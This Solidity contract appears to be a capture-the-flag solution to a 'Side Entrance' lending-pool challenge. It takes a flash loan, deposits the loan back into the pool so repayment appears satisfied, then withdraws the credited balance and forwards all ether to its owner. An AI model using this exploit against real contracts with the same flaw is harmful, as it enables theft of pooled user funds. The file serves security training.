// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract FlashloanReceiver is IFlashLoanEtherReceiver {
    address payable private owner;
    SideEntranceLenderPool pool;

    constructor(address sideEntrancePoolAddr, address _owner) {
        pool = SideEntranceLenderPool(sideEntrancePoolAddr);
        owner = payable(_owner);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function start(uint256 _amount) external payable {
        pool.flashLoan(_amount);
    }

    function withdrawFromPool() external payable {
        pool.withdraw();
    }

    receive() external payable {
        owner.transfer(msg.value);
    }

    fallback() external payable {
        owner.transfer(msg.value);
    }
}
